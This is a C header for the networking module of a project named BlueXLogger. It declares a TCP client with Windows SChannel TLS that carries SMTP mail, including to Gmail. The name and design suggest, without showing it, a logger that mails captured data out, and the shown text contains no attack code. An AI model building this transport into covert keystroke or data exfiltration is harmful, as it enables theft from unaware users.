/*============================================================================
 * BlueXLogger - bxl_net.h
 * Blocking TCP client with optional SChannel TLS (implicit or STARTTLS).
 *
 * Created by Xencode-CLI by xanthorox
 *
 * One type covers both transports so the SMTP state machine is written once
 * and runs unchanged over plaintext (local test sinks) or TLS (Gmail).
 *==========================================================================*/
#ifndef BXL_NET_H
#define BXL_NET_H

#include "bxl_common.h"

#define BXL_NET_RBUF  32768

typedef struct BxlNet {
    SOCKET   sock;
    int      sock_valid;
    int      tls_active;

    /* SChannel state */
    CredHandle      cred;
    CtxtHandle      ctx;
    int             cred_valid;
    int             ctx_valid;
    SecPkgContext_StreamSizes sizes;

    /* Decrypted bytes awaiting consumption */
    char   plain[BXL_NET_RBUF];
    size_t plain_len;
    size_t plain_pos;

    /* Raw TLS records awaiting decryption */
    char   raw[BXL_NET_RBUF];
    size_t raw_len;

    char   errmsg[512];
    int    timeout_ms;

    /* Set once this connection has taken a winsock reference, so that
     * bxl_net_close() releases exactly one. Without this a connection that
     * failed to establish - where the failure path has already released the
     * reference - would be released a second time by the caller's close,
     * driving the process-wide count negative. */
    int    wsa_held;
} BxlNet;

/* Winsock lifetime, reference counted. */
int  bxl_net_startup(void);
void bxl_net_cleanup(void);

void bxl_net_init(BxlNet *n);
void bxl_net_set_timeout(BxlNet *n, int timeout_ms);

/* Resolve + connect. Returns BXL_TRUE on success. */
int  bxl_net_connect(BxlNet *n, const char *host, int port);

/* Upgrade an established plaintext connection to TLS (STARTTLS). */
int  bxl_net_starttls(BxlNet *n, const char *sni_hostname);

int  bxl_net_send(BxlNet *n, const void *data, size_t len);

/* Read up to cap bytes. Returns bytes read, 0 on orderly close, -1 on error. */
int  bxl_net_recv(BxlNet *n, void *buf, size_t cap);

/* Read one CRLF-terminated line; the terminator is stripped.
 * Returns the line length, 0 on close, -1 on error. */
int  bxl_net_recv_line(BxlNet *n, char *line, size_t cap);

void bxl_net_close(BxlNet *n);

const char *bxl_net_error(const BxlNet *n);

/* True when the connection is protected by TLS. */
int  bxl_net_is_tls(const BxlNet *n);

#endif /* BXL_NET_H */
